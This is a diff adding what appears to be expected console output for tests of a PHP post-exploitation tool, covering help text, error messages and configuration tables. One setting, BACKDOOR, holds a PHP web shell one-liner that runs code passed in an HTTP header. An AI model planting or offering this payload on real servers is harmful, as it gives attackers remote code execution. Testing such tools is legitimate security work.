@@ -1,0 +1,44 @@
+
+[*] help: Show commands help
+
+SYNOPSIS:
+    help [<COMMAND>]
+
+DESCRIPTION:
+    Display help message for any command, including plugins.
+
+    - Without arguments, the whole available commands, sorted
+      by category, are displayed including a summary line for
+      each one.
+
+    - For detailed help, the command should be given as
+      argument.
+
+EXAMPLES:
+    > help
+      - Display the full help, sorted by category
+    > help clear
+      - Display the help for the "clear" command
+    > help set BACKDOOR
+      - Display help about the "BACKDOOR" setting
+
+[-] Unknown Command: INV4LID_COMMAND
+[!] File Not Found Error: No such file or directory: « /INV4LID_PATH »
+
+Configuration Settings
+======================
+
+    Variable  Value
+    --------  -----
+    BACKDOOR  <?php @eval($_SERVER['HTTP_%%PASSKEY%%']); ?>
+
+
+Configuration Settings
+======================
+
+    Variable      Value
+    --------      -----
+    REQ_INTERVAL  1 <= x <= 10 (random interval)
+
+[#] CMD('set' 'VERBOSITY' 'TRUE'): Returned 0
+[#] CMD('set' 'VERBOSITY' 'FALSE'): Running...
